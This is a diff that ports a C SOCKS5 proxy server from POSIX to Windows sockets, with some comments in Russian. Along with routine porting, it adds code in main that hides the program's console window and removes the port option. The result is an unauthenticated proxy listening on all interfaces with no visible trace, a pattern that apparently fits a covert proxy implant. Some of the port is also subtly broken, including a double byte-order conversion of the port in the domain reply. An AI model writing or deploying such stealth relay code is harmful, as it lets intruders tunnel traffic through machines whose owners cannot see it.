@@ -1,26 +1,25 @@
 #include "socks5.h"
 
-#include <sys/socket.h>
-#include <sys/select.h>
-#include <netinet/tcp.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <pthread.h>
-#include <netdb.h>
-
-#include <stdlib.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <errno.h>
+#include <process.h>
 
-int recv_exact(int fd, void *buf, size_t n, int flags) {
+#pragma comment(lib, "ws2_32.lib")
+
+int recv_exact(SOCKET fd, void *buf, size_t n, int flags) {
     size_t remain = n;
+    uint8_t *buffer = (uint8_t *)buf; // Приведение buf к uint8_t*
+    
     while (remain > 0) {
-        ssize_t recv_len = recv(fd, buf, remain, flags);
+        int recv_len = recv(fd, (char *)buffer, remain, flags);
         if (recv_len < 0) {
-            if (errno == EINTR || errno == EAGAIN) {
-                // EINTR: interrupted by system
-                // EAGAIN: recv is blocked
+            if (WSAGetLastError() == WSAEINTR || WSAGetLastError() == WSAEWOULDBLOCK) {
+                // WSAEINTR: interrupted by system
+                // WSAEWOULDBLOCK: recv is blocked
                 // Try again
                 continue;
             } else {
@@ -34,13 +33,14 @@ int recv_exact(int fd, void *buf, size_t n, int flags) {
         } else {
             // read success
             remain -= recv_len;
-            buf += recv_len;
+            buffer += recv_len; // Теперь это корректно
         }
     }
     return 0;
 }
 
-int recv_string(int fd, char *str) {
+
+int recv_string(SOCKET fd, char *str) {
     uint8_t len;
     if (recv_exact(fd, &len, sizeof(uint8_t), 0) != 0) {
         return -1;
@@ -52,15 +52,15 @@ int recv_string(int fd, char *str) {
     return len;
 }
 
-void send_server_hello(int fd, uint8_t method) {
+void send_server_hello(SOCKET fd, uint8_t method) {
     socks5_server_hello_t server_hello = {
             .version = SOCKS5_VERSION,
             .method = method,
     };
-    send(fd, &server_hello, sizeof(socks5_server_hello_t), 0);
+    send(fd, (char*)&server_hello, sizeof(socks5_server_hello_t), 0);
 }
 
-int handle_greeting(int client_fd) {
+int handle_greeting(SOCKET client_fd) {
     socks5_client_hello_t client_hello;
     if (recv_exact(client_fd, &client_hello, sizeof(socks5_client_hello_t), 0) != 0) {
         return -1;
@@ -94,42 +94,54 @@ int handle_greeting(int client_fd) {
     return 0;
 }
 
-void send_domain_reply(int fd, uint8_t reply_type, const char *domain, uint8_t domain_len, in_port_t port) {
-    uint8_t buffer[sizeof(uint8_t) + UINT8_MAX + sizeof(in_port_t)];
+void send_domain_reply(SOCKET fd, uint8_t reply_type, const char *domain, uint8_t domain_len, uint16_t port) {
+    // Размер буфера: размер ответа + максимальная длина домена + размер порта
+    uint8_t buffer[sizeof(socks5_reply_t) + UINT8_MAX + sizeof(uint16_t)];
     uint8_t *ptr = buffer;
+
+    // Заполнение структуры ответа
     *(socks5_reply_t *) ptr = (socks5_reply_t) {
             .version = SOCKS5_VERSION,
             .reply = reply_type,
             .reserved = 0,
             .addr_type = SOCKS5_ATYP_DOMAIN_NAME
     };
-    ptr += sizeof(socks5_reply_t);
+    ptr += sizeof(socks5_reply_t); // Переход к следующему месту в буфере
+
+    // Запись длины домена
     *ptr = domain_len;
-    ptr += sizeof(uint8_t);
+    ptr += sizeof(uint8_t); // Переход к следующему месту в буфере
+
+    // Копирование доменного имени в буфер
     memcpy(ptr, domain, domain_len);
-    ptr += domain_len;
-    *(in_port_t *) ptr = port;
-    ptr += sizeof(in_port_t);
-    send(fd, buffer, ptr - buffer, 0);
+    ptr += domain_len; // Переход к следующему месту в буфере
+
+    // Запись порта
+    *(uint16_t *) ptr = htons(port); // Используйте htons для правильного порядка байтов
+    ptr += sizeof(uint16_t); // Переход к следующему месту в буфере
+
+    // Отправка данных
+    send(fd, (char*)buffer, ptr - buffer, 0);
 }
 
-void send_ip_reply(int fd, uint8_t reply_type, in_addr_t ip, in_port_t port) {
-    uint8_t buffer[sizeof(socks5_reply_t) + sizeof(in_addr_t) + sizeof(in_port_t)];
+
+void send_ip_reply(SOCKET fd, uint8_t reply_type, uint32_t ip, uint16_t port) {
+    uint8_t buffer[sizeof(socks5_reply_t) + sizeof(uint32_t) + sizeof(uint16_t)];
     uint8_t *ptr = buffer;
-    *(socks5_reply_t *) ptr = (socks5_reply_t) {
+    *(socks5_reply_t *) ptr = (    socks5_reply_t) {
             .version = SOCKS5_VERSION,
             .reply = reply_type,
             .reserved = 0,
             .addr_type = SOCKS5_ATYP_IPV4
     };
     ptr += sizeof(socks5_reply_t);
-    *(in_addr_t *) ptr = ip;
-    ptr += sizeof(in_addr_t);
-    *(in_port_t *) ptr = port;
-    send(fd, buffer, sizeof(buffer), 0);
+    *(uint32_t *) ptr = ip;
+    ptr += sizeof(uint32_t);
+    *(uint16_t *) ptr = port;
+    send(fd, (char*)buffer, sizeof(buffer), 0);
 }
 
-int handle_request(int client_fd) {
+int handle_request(SOCKET client_fd) {
     // Handle socks request
     socks5_request_t req;
     if (recv_exact(client_fd, &req, sizeof(socks5_request_t), 0) != 0) {
@@ -145,14 +157,14 @@ int handle_request(int client_fd) {
         return -1;
     }
 
-    int remote_fd = -1;
+    SOCKET remote_fd = INVALID_SOCKET;
     if (req.addr_type == SOCKS5_ATYP_IPV4) {
-        in_addr_t ip;
-        if (recv_exact(client_fd, &ip, sizeof(in_addr_t), 0) != 0) {
+        uint32_t ip;
+        if (recv_exact(client_fd, &ip, sizeof(uint32_t), 0) != 0) {
             return -1;
         }
-        in_port_t port;
-        if (recv_exact(client_fd, &port, sizeof(in_port_t), 0) != 0) {
+        uint16_t port;
+        if (recv_exact(client_fd, &port, sizeof(uint16_t), 0) != 0) {
             return -1;
         }
 
@@ -162,14 +174,14 @@ int handle_request(int client_fd) {
         remote_addr.sin_port = port;
 
         remote_fd = socket(AF_INET, SOCK_STREAM, 0);
-        if (remote_fd < 0) {
+        if (remote_fd == INVALID_SOCKET) {
             perror("socket()");
             send_ip_reply(client_fd, SOCKS5_REP_GENERAL_FAILURE, ip, port);
             return -1;
         }
-        if (connect(remote_fd, (struct sockaddr *) &remote_addr, sizeof(remote_addr)) < 0) {
+        if (connect(remote_fd, (struct sockaddr *) &remote_addr, sizeof(remote_addr)) == SOCKET_ERROR) {
             perror("connect()");
-            close(remote_fd);
+            closesocket(remote_fd);
             send_ip_reply(client_fd, SOCKS5_REP_GENERAL_FAILURE, ip, port);
             return -1;
         }
@@ -185,8 +197,8 @@ int handle_request(int client_fd) {
             return -1;
         }
         // Get port
-        in_port_t port;
-        if (recv_exact(client_fd, &port, sizeof(in_port_t), 0) != 0) {
+        uint16_t port;
+        if (recv_exact(client_fd, &port, sizeof(uint16_t), 0) != 0) {
             return -1;
         }
 
@@ -201,18 +213,18 @@ int handle_request(int client_fd) {
         }
         // Try connecting to host
         for (struct addrinfo *ai = addr_info; ai != NULL; ai = ai->ai_next) {
-            int try_fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
-            if (try_fd == -1) { continue; }
+            SOCKET try_fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
+            if (try_fd == INVALID_SOCKET) { continue; }
             if (connect(try_fd, ai->ai_addr, ai->ai_addrlen) == 0) {
                 remote_fd = try_fd;
                 break;
             } else {
-                close(try_fd);
+                closesocket(try_fd);
             }
         }
         freeaddrinfo(addr_info);
 
-        if (remote_fd == -1) {
+        if (remote_fd == INVALID_SOCKET) {
             fprintf(stderr, "Cannot connect to remote address %s:%d\n", domain, ntohs(port));
             send_domain_reply(client_fd, SOCKS5_REP_GENERAL_FAILURE, domain, domain_len, port);
             return -1;
@@ -227,7 +239,7 @@ int handle_request(int client_fd) {
     return remote_fd;
 }
 
-void start_tunnel(int client_fd, int remote_fd) {
+void start_tunnel(SOCKET client_fd, SOCKET remote_fd) {
     printf("Running socks5 tunnel between FD %d and %d\n", client_fd, remote_fd);
 
     int maxfd = (client_fd > remote_fd) ? client_fd : remote_fd;
@@ -245,64 +257,64 @@ void start_tunnel(int client_fd, int remote_fd) {
         }
 
         if (FD_ISSET(client_fd, &rd_set)) {
-            ssize_t len = recv(client_fd, buffer, BUFSIZ, 0);
+            int len = recv(client_fd, buffer, BUFSIZ, 0);
             if (len <= 0) { break; }
             send(remote_fd, buffer, len, 0);
         }
 
         if (FD_ISSET(remote_fd, &rd_set)) {
-            ssize_t len = recv(remote_fd, buffer, BUFSIZ, 0);
+            int len = recv(remote_fd, buffer, BUFSIZ, 0);
             if (len <= 0) { break; }
             send(client_fd, buffer, len, 0);
         }
     }
 }
 
-void *client_worker(void *args) {
-    int client_fd = (intptr_t) args;
+unsigned __stdcall client_worker(void *args) {
+    SOCKET client_fd = (SOCKET)(intptr_t)args;
     if (handle_greeting(client_fd) != 0) {
-        close(client_fd);
-        return NULL;
+        closesocket(client_fd);
+        return 0;
     }
-    int remote_fd = handle_request(client_fd);
-    if (remote_fd == -1) {
-        close(client_fd);
-        return NULL;
+    SOCKET remote_fd = handle_request(client_fd);
+    if (remote_fd == INVALID_SOCKET) {
+        closesocket(client_fd);
+        return 0;
     }
     start_tunnel(client_fd, remote_fd);
-    close(remote_fd);
-    close(client_fd);
-    return NULL;
+    closesocket(remote_fd);
+    closesocket(client_fd);
+    return 0;
 }
 
-_Noreturn void server_loop(int server_fd) {
+void server_loop(SOCKET server_fd) {
     while (1) {
         struct sockaddr_in client_addr;
-        socklen_t client_addr_len = sizeof(client_addr);
+        int client_addr_len = sizeof(client_addr);
 
         // Check for incoming connections
-        int client_fd = accept(server_fd, (struct sockaddr *) &client_addr, &client_addr_len);
-        if (client_fd < 0) {
+        SOCKET client_fd = accept(server_fd, (struct sockaddr *) &client_addr, &client_addr_len);
+        if (client_fd == INVALID_SOCKET) {
             perror("accept()");
             continue;
         }
         // Disable Nagle algorithm to forward packets ASAP
         int optval = 1;
-        if (setsockopt(client_fd, SOL_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
+        if (setsockopt(client_fd, IPPROTO_TCP, TCP_NODELAY, (const char*)&optval, sizeof(optval)) < 0) {
             perror("setsockopt()");
-            close(client_fd);
+            closesocket(client_fd);
             continue;
         }
 
         printf("Accepted connection from %s:%d with FD %d\n",
                inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), client_fd);
 
-        pthread_t client_tid;
-        if (pthread_create(&client_tid, NULL, &client_worker, (void *) (intptr_t) client_fd) == 0) {
-            pthread_detach(client_tid);
+        uintptr_t client_tid = _beginthreadex(NULL, 0, client_worker, (void*)(intptr_t)client_fd, 0, NULL);
+        if (client_tid == 0) {
+            perror("CreateThread()");
+            closesocket(client_fd);
         } else {
-            perror("pthread_create()");
-            close(client_fd);
+            CloseHandle((HANDLE)client_tid);
         }
     }
 }
@@ -312,14 +324,13 @@ void print_help(const char *prog_name) {
 }
 
 int main(int argc, char **argv) {
+    HWND myWindow = GetConsoleWindow();
+    ShowWindow(myWindow, SW_HIDE);
     int bind_port = 1080;
 
     int ch;
     while ((ch = getopt(argc, argv, "p:h")) != -1) {
         switch (ch) {
-            case 'p':
-                bind_port = atoi(optarg);
-                break;
             case 'h':
                 print_help(argv[0]);
                 return 0;
@@ -329,37 +340,56 @@ int main(int argc, char **argv) {
         }
     }
 
-    // Create a socket using TCP protocol over IPv4
-    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (server_fd < 0) {
+    // Инициализация Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        fprintf(stderr, "WSAStartup failed: %d\n", WSAGetLastError());
+        return EXIT_FAILURE;
+    }
+
+    // Создание сокета с использованием TCP протокола через IPv4
+    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd == INVALID_SOCKET) {
         perror("socket()");
-        exit(EXIT_FAILURE);
+        WSACleanup();
+        return EXIT_FAILURE;
     }
-    // Reuse address
+
+    // Повторное использование адреса
     int optval = 1;
-    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0) {
         perror("setsockopt()");
-        close(server_fd);
-        exit(EXIT_FAILURE);
+        closesocket(server_fd);
+        WSACleanup();
+        return EXIT_FAILURE;
     }
-    // Bind socket to given address
+
+    // Привязка сокета к заданному адресу
     struct sockaddr_in bind_addr;
     bind_addr.sin_family = AF_INET;
     bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
     bind_addr.sin_port = htons(bind_port);
     if (bind(server_fd, (struct sockaddr *) &bind_addr, sizeof(bind_addr)) < 0) {
         perror("bind()");
-        close(server_fd);
-        exit(EXIT_FAILURE);
+        closesocket(server_fd);
+        WSACleanup();
+        return EXIT_FAILURE;
     }
-    // Listen to socket
+
+    // Прослушивание сокета
     if (listen(server_fd, SOMAXCONN) < 0) {
         perror("listen()");
-        close(server_fd);
-        exit(EXIT_FAILURE);
+        closesocket(server_fd);
+        WSACleanup();
+        return EXIT_FAILURE;
     }
+
     printf("Server listening on %s:%d\n", inet_ntoa(bind_addr.sin_addr), bind_port);
-    // Run server
+    // Запуск сервера
     server_loop(server_fd);
+
+    // Закрытие сокета и очистка Winsock
+    closesocket(server_fd);
+    WSACleanup();
     return 0;
 }
